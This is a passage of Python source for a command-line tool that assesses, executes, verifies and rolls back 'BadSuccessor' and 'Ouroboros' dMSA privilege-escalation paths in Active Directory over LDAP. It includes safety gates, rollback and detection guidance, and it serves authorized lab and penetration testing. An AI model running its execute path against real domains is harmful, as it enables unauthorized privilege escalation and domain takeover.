            # Safe path: no shell, argument list passed directly.
            proc = subprocess.run(list(external_argv), shell=False, capture_output=True, text=True)
            ok = proc.returncode == 0
            try:
                op.metadata["external_verification"] = _external_output_metadata(
                    mode="argv",
                    exit_code=proc.returncode,
                    stdout=proc.stdout,
                    stderr=proc.stderr,
                    argv=list(external_argv),
                    store_output=store_external_output,
                )
            except ValueError as exc:
                raise typer.BadParameter(str(exc)) from exc
            if not ok:
                op.metadata["external_verification"]["failure_class"] = _classify_external_failure(
                    proc.stdout, proc.stderr
                )
            if ok:
                op.verified = True
                op.verified_external = True
                from datetime import datetime, timezone
                op.external_verified_at = (
                    datetime.now(timezone.utc)
                    .replace(microsecond=0)
                    .isoformat()
                    .replace("+00:00", "Z")
                )
            save_operation(op)
            if json_out:
                _write_json(
                    json_out,
                    {
                        "mode": "external",
                        "operation_id": op.id,
                        "ok": ok,
                        "external_verification": op.metadata["external_verification"],
                        "operation": op.model_dump(mode="json"),
                    },
                )
                print(f"[green]wrote verify JSON[/green] {json_out}")
            print(f"mode=external argv exit={proc.returncode} verified={ok}")
        elif external_cmd:
            if not allow_shell_external:
                raise typer.BadParameter(
                    "--external-cmd uses shell=True and requires --allow-shell-external. "
                    "Prefer --external-argv."
                )
            print(
                "[yellow]WARNING:[/yellow] --external-cmd is executed through the shell "
                "(shell=True). Do not pass untrusted input. "
                "Prefer --external-argv for a safer invocation."
            )
            proc = subprocess.run(external_cmd, shell=True, capture_output=True, text=True)  # noqa: S602
            ok = proc.returncode == 0
            try:
                op.metadata["external_verification"] = _external_output_metadata(
                    mode="shell",
                    exit_code=proc.returncode,
                    stdout=proc.stdout,
                    stderr=proc.stderr,
                    command=external_cmd,
                    store_output=store_external_output,
                )
            except ValueError as exc:
                raise typer.BadParameter(str(exc)) from exc
            if not ok:
                op.metadata["external_verification"]["failure_class"] = _classify_external_failure(
                    proc.stdout, proc.stderr
                )
            if ok:
                op.verified = True
                op.verified_external = True
                from datetime import datetime, timezone
                op.external_verified_at = (
                    datetime.now(timezone.utc)
                    .replace(microsecond=0)
                    .isoformat()
                    .replace("+00:00", "Z")
                )
            save_operation(op)
            if json_out:
                _write_json(
                    json_out,
                    {
                        "mode": "external",
                        "operation_id": op.id,
                        "ok": ok,
                        "external_verification": op.metadata["external_verification"],
                        "operation": op.model_dump(mode="json"),
                    },
                )
                print(f"[green]wrote verify JSON[/green] {json_out}")
            print(f"mode=external cmd exit={proc.returncode} verified={ok}")
        else:
            raise typer.BadParameter(
                "--evidence-file, --kerberos-adapter, --external-cmd, or --external-argv "
                "is required for --mode external.\n"
                "Preferred: --evidence-file proof.json\n"
                "Adapter:   --kerberos-adapter external --adapter-command '...'\n"
                "Legacy:    --external-argv <tool> <args> or --external-cmd \"...\""
            )

    else:
        raise typer.BadParameter(f"unsupported --mode: {mode}  (supported: ldap, external)")


@app.command("rollback")
def rollback_cmd(
    op_id: str = typer.Option(..., "--op", help="Operation ID to roll back (e.g. OP-20260528-deadbeef)."),
    ops_dir: Optional[Path] = typer.Option(
        None,
        "--ops-dir",
        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
    ),
    json_out: Optional[Path] = typer.Option(None, "--json", help="Write rollback result as JSON."),
    domain: str = _OPT_DOMAIN,
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
):
    """Rollback an operation in reverse order and verify the final LDAP state."""
    configure_ops_dir(ops_dir)
    op = load_operation(op_id)
    if not op.rollback_available and (op.rolled_back or op.status == "rolled-back"):
        if json_out:
            _write_json(
                json_out,
                {
                    "operation_id": op.id,
                    "status": op.status,
                    "rollback_available": op.rollback_available,
                    "rollback_verified": op.rollback_verified,
                    "already_rolled_back": True,
                    "operation": op.model_dump(mode="json"),
                    "previous_ldap_verification": op.metadata.get("ldap_verification"),
                },
            )
            print(f"[green]wrote rollback JSON[/green] {json_out}")
        print("operation already rolled back; rollback not available")
        print(
            f"operation status={op.status} rollback_verified="
            f"{str(op.rollback_verified).lower()}"
        )
        previous = op.metadata.get("ldap_verification")
        if isinstance(previous, dict):
            print(f"previous ldap verification={previous.get('status', 'unknown')}")
        return

    cfg = _make_ldap_config(domain, dc_ip, dc_host, username, password, kerberos, use_ldaps)
    conn = bind(cfg)
    op = rollback_operation(op, conn=conn)
    save_operation(op)
    if json_out:
        _write_json(
            json_out,
            {
                "operation_id": op.id,
                "status": op.status,
                "rollback_available": op.rollback_available,
                "rollback_verified": op.rollback_verified,
                "operation": op.model_dump(mode="json"),
                "previous_ldap_verification": op.metadata.get("ldap_verification"),
                "rollback_verification": op.metadata.get("rollback_verification"),
            },
        )
        print(f"[green]wrote rollback JSON[/green] {json_out}")
    if op.status == "rolled-back":
        print(
            f"[yellow]operation[/yellow] {op.id} status=rolled-back "
            f"rollback_verified={str(op.rollback_verified).lower()}"
        )
        previous = op.metadata.get("ldap_verification")
        if isinstance(previous, dict):
            print(f"previous ldap verification={previous.get('status', 'unknown')}")
    elif op.status == "rollback-not-available":
        print("operation rollback not available")
        print(f"[yellow]operation[/yellow] {op.id} status={op.status}")
    else:
        print(
            f"[yellow]operation[/yellow] {op.id} status={op.status} "
            f"rollback_verified={str(op.rollback_verified).lower()}"
        )


@badsuccessor_app.command("assess")
def badsuccessor_assess_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    expand_targets: bool = typer.Option(True, "--expand-targets/--grouped"),
    exclude_legacy: bool = typer.Option(False, "--exclude-legacy"),
    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
    require_kerberos_ready: bool = typer.Option(False, "--require-kerberos-ready"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Assess BadSuccessor-capable paths from map state without LDAP writes."""
    state = MapState.load(state_path)
    _require_kerberos_ready_if_requested(state, require_kerberos_ready)
    assessment = assess_badsuccessor(
        state,
        expand_targets=expand_targets,
        exclude_legacy=exclude_legacy,
        include_sensitive_targets=include_sensitive_targets,
    )
    if json_output:
        typer.echo(json.dumps(assessment, indent=2, default=str))
    else:
        _print_badsuccessor_table(assessment)


@badsuccessor_app.command("plan")
def badsuccessor_plan_cmd(
    path_id: str = typer.Option(..., "--path"),
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    paths_file: Optional[Path] = typer.Option(None, "--paths"),
    expand_targets: bool = typer.Option(True, "--expand-targets/--grouped"),
    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Build a structured BadSuccessor plan without LDAP writes."""
    _, paths = _load_paths_for_state(
        state_path,
        paths_file,
        expand_targets=expand_targets,
        only=["badsuccessor"],
        include_sensitive_targets=include_sensitive_targets,
    )
    selected = _select_path(paths, path_id)
    plan = build_badsuccessor_plan(selected)
    if json_output:
        typer.echo(json.dumps(plan, indent=2, default=str))
    else:
        print(Panel(
            "\n".join(plan["dry_run_steps"]),
            title=f"BadSuccessor plan {selected.id} {selected.primitive}",
            subtitle="No LDAP writes will be made",
            expand=False,
        ))


@badsuccessor_app.command("execute")
def badsuccessor_execute_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    paths_file: Optional[Path] = typer.Option(None, "--paths"),
    expand_targets: bool = typer.Option(False, "--expand-targets"),
    path_id: str = typer.Option(..., "--path"),
    confirm: bool = typer.Option(False, "--confirm"),
    confirm_string: Optional[str] = typer.Option(None, "--confirm-string"),
    dry_run: bool = typer.Option(False, "--dry-run"),
    scope_file: Optional[Path] = typer.Option(None, "--scope"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    lab_unsafe: bool = typer.Option(False, "--lab-unsafe"),
    allow_broad_dacl: bool = typer.Option(False, "--allow-broad-dacl"),
    allow_legacy_oneway_link: bool = typer.Option(False, "--allow-legacy-oneway-link"),
    allow_existing_dmsa_legacy_link: bool = typer.Option(
        False, "--allow-existing-dmsa-legacy-link"
    ),
    allow_lab_environment: bool = typer.Option(False, "--allow-lab-environment"),
    allow_unmapped_target: bool = typer.Option(False, "--allow-unmapped-target"),
    allow_unmapped_container: bool = typer.Option(False, "--allow-unmapped-container"),
    allow_unmapped_dmsa: bool = typer.Option(False, "--allow-unmapped-dmsa"),
    allow_grouped_target_selection: bool = typer.Option(
        False, "--allow-grouped-target-selection"
    ),
    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    target_dn: Optional[str] = typer.Option(None, "--target-dn"),
    container_dn: Optional[str] = typer.Option(None, "--container-dn"),
    chain: Optional[str] = typer.Option(None, "--chain"),
    dmsa_name: Optional[str] = typer.Option(None, "--dmsa-name"),
):
    """Execute a BadSuccessor plan through the existing exploit lifecycle."""
    _, paths = _load_paths_for_state(
        state_path,
        paths_file,
        expand_targets=expand_targets,
        only=["badsuccessor"],
        include_sensitive_targets=include_sensitive_targets,
    )
    selected = _select_path(paths, path_id)
    effective_target = target_dn or selected.target_dn
    if is_sensitive_target(effective_target) and not include_sensitive_targets:
        raise typer.BadParameter(
            "sensitive targets are hidden by default; pass --include-sensitive-targets "
            "for an authorized lab validation"
        )
    if selected.primitive == "legacy-oneway-link" and not allow_legacy_oneway_link:
        raise typer.BadParameter("legacy-oneway-link requires --allow-legacy-oneway-link")
    if (
        selected.primitive == "existing-dmsa-legacy-link"
        and not allow_existing_dmsa_legacy_link
    ):
        raise typer.BadParameter(
            "existing-dmsa-legacy-link requires --allow-existing-dmsa-legacy-link"
        )
    exploit_cmd(
        state_path=state_path,
        paths_file=paths_file,
        expand_targets=expand_targets,
        path_id=path_id,
        primitive_name=None,
        confirm=confirm,
        confirm_string=confirm_string,
        dry_run=dry_run,
        scope_file=scope_file,
        ops_dir=ops_dir,
        lab_unsafe=lab_unsafe,
        allow_broad_dacl=allow_broad_dacl,
        allow_legacy_oneway_link=allow_legacy_oneway_link,
        allow_existing_dmsa_legacy_link=allow_existing_dmsa_legacy_link,
        allow_lab_environment=allow_lab_environment,
        allow_unmapped_target=allow_unmapped_target,
        allow_unmapped_container=allow_unmapped_container,
        allow_unmapped_dmsa=allow_unmapped_dmsa,
        allow_grouped_target_selection=allow_grouped_target_selection,
        json_out=json_out,
        domain=domain,
        dc_ip=dc_ip,
        dc_host=dc_host,
        username=username,
        password=password,
        kerberos=kerberos,
        use_ldaps=use_ldaps,
        target_dn=target_dn,
        container_dn=container_dn,
        chain=chain,
        dmsa_name=dmsa_name,
    )


@badsuccessor_app.command("verify")
def badsuccessor_verify_cmd(
    op_id: str = typer.Option(..., "--op"),
    mode: str = typer.Option("ldap", "--mode"),
    evidence_file: Optional[Path] = typer.Option(None, "--evidence-file"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON summary to stdout."),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
):
    """Verify BadSuccessor lifecycle state without conflating LDAP and Kerberos proof."""
    verify_kwargs: dict[str, Any] = {
        "op_id": op_id,
        "mode": mode,
        "json_out": None,
        "external_cmd": None,
        "external_argv": None,
        "evidence_file": evidence_file,
        "kerberos_adapter": None,
        "adapter_command": None,
        "adapter_command_file": None,
        "adapter_dry_run": False,
        "lab_unsafe_kerberos_proof": False,
        "scope_file": None,
        "confirm_string": None,
        "allow_shell_external": False,
        "store_external_output": False,
        "ops_dir": ops_dir,
        "domain": domain,
        "dc_ip": dc_ip,
        "dc_host": dc_host,
        "username": username,
        "password": password,
        "kerberos": kerberos,
        "use_ldaps": use_ldaps,
    }
    if json_output:
        import contextlib
        import io
        with contextlib.redirect_stdout(io.StringIO()):
            verify_cmd(**verify_kwargs)
    else:
        verify_cmd(**verify_kwargs)
    op = load_operation(op_id, ops_dir=ops_dir)
    summary = {
        "type": "badsuccessor-verification",
        **operation_lifecycle_summary(op),
        "full_badsuccessor_success": op.verified_ldap and op.verified_external,
    }
    if json_output:
        typer.echo(json.dumps(summary, indent=2, default=str))
    else:
        print(
            "badsuccessor "
            f"ldap_verified={str(summary['ldap_verified']).lower()} "
            f"kerberos_base_verified={str(summary['kerberos_base_verified']).lower()} "
            f"kerberos_dmsa_verified={str(summary['kerberos_dmsa_verified']).lower()} "
            f"external_verified={str(summary['external_verified']).lower()}"
        )
        if not op.verified_external:
            print("full BadSuccessor success not claimed: kerberos-dmsa-proof is missing")


@badsuccessor_app.command("report")
def badsuccessor_report_cmd(
    op_id: str = typer.Option(..., "--op"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Summarize BadSuccessor execution, proof, rollback, and cleanup state."""
    configure_ops_dir(ops_dir)
    op = load_operation(op_id)
    report = build_operation_report(op)
    report["type"] = "badsuccessor-report"
    if json_output:
        typer.echo(json.dumps(report, indent=2, default=str))
    else:
        print(operation_report_markdown(report))


@ouroboros_app.command("assess")
def ouroboros_assess_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
    require_kerberos_ready: bool = typer.Option(False, "--require-kerberos-ready"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Assess Ouroboros-capable conditions without native secret extraction."""
    state = MapState.load(state_path)
    kerberos_ready = None
    if require_kerberos_ready:
        ready, notes = _kerberos_ready_for_state(state)
        if not ready:
            raise typer.BadParameter(
                "--require-kerberos-ready failed: " + "; ".join(notes)
            )
        kerberos_ready = True
    assessment = assess_ouroboros(
        state,
        include_sensitive_targets=include_sensitive_targets,
        kerberos_ready=kerberos_ready,
    )
    if json_output:
        typer.echo(json.dumps(assessment, indent=2, default=str))
    else:
        _print_ouroboros_summary(assessment)


@ouroboros_app.command("plan")
def ouroboros_plan_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    path_id: Optional[str] = typer.Option(None, "--path"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Produce an Ouroboros plan with proof requirements and no live extraction."""
    state = MapState.load(state_path)
    selected = None
    if path_id:
        paths = classified_paths(
            state,
            expand_targets=True,
            only=["postpatch-mutual-pair", "existing-dmsa-postpatch-mutual", "self-pkinit-loop"],
        )
        selected = _select_path(paths, path_id)
    plan = build_ouroboros_plan(state, selected)
    if json_output:
        typer.echo(json.dumps(plan, indent=2, default=str))
    else:
        typer.echo(json.dumps(plan, indent=2, default=str))


@ouroboros_app.command("simulate")
def ouroboros_simulate_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Simulate Ouroboros proof requirements from fixtures/state only."""
    state = MapState.load(state_path)
    simulation = build_ouroboros_simulation(state)
    if json_output:
        typer.echo(json.dumps(simulation, indent=2, default=str))
    else:
        typer.echo(json.dumps(simulation, indent=2, default=str))


@ouroboros_app.command("verify")
def ouroboros_verify_cmd(
    op_id: str = typer.Option(..., "--op"),
    evidence_file: Path = typer.Option(..., "--evidence-file"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Record only structured external Ouroboros/dMSA proof for active operations."""
    configure_ops_dir(ops_dir)
    op = load_operation(op_id)
    evidence, digest = load_evidence_file(evidence_file)
    try:
        proof = validate_kerberos_evidence(op, evidence, digest)
    except ExternalProofError as exc:
        raise typer.BadParameter(str(exc)) from exc
    if proof.get("type") == BASE_PROOF_TYPE:
        record_kerberos_base_check(op, proof)
        verified = False
    else:
        record_external_verification(op, proof)
        verified = True
    save_operation(op)
    result = {
        "type": "ouroboros-verification",
        "operation_id": op.id,
        "verified": verified,
        "proof_type": proof.get("type"),
        "proof": proof,
        "operation_lifecycle": operation_lifecycle_summary(op),
    }
    if json_output:
        typer.echo(json.dumps(result, indent=2, default=str))
    else:
        print(
            "ouroboros "
            f"proof_type={proof.get('type')} verified={str(verified).lower()} "
            f"external_verified={str(op.verified_external).lower()}"
        )


@ouroboros_app.command("report")
def ouroboros_report_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    op_id: Optional[str] = typer.Option(None, "--op"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
):
    """Report Ouroboros assessment and proof state without exposing secrets."""
    state = MapState.load(state_path)
    assessment = assess_ouroboros(state)
    report: dict[str, Any] = {
        "type": "ouroboros-report",
        "assessment": assessment,
        "persistence_risk_classification": "controlled-lab-validation-only",
        "cleanup_state": "unknown",
        "detection_guidance": [
            "Monitor dMSA creation/link attributes and postpatch target-side attributes.",
            "Monitor Kerberos proof tooling externally; raw ticket data is not logged here.",
        ],
    }
    if op_id:
        configure_ops_dir(ops_dir)
        op = load_operation(op_id)
        report["operation"] = operation_lifecycle_summary(op)
        report["cleanup_state"] = "rolled-back" if op.rolled_back else "active"
    if json_output:
        typer.echo(json.dumps(report, indent=2, default=str))
    else:
        typer.echo(json.dumps(report, indent=2, default=str))


@app.command("report")
def report_cmd(
    op_id: str = typer.Option(..., "--op"),
    output_format: str = typer.Option("json", "--format", help="json | markdown"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
):
    """Emit a defensive-quality operation report without secrets."""
    configure_ops_dir(ops_dir)
    op = load_operation(op_id)
    report = build_operation_report(op)
    if output_format == "json":
        typer.echo(json.dumps(report, indent=2, default=str))
    elif output_format == "markdown":
        print(operation_report_markdown(report))
    else:
        raise typer.BadParameter("--format must be 'json' or 'markdown'")


if __name__ == "__main__":
    app()
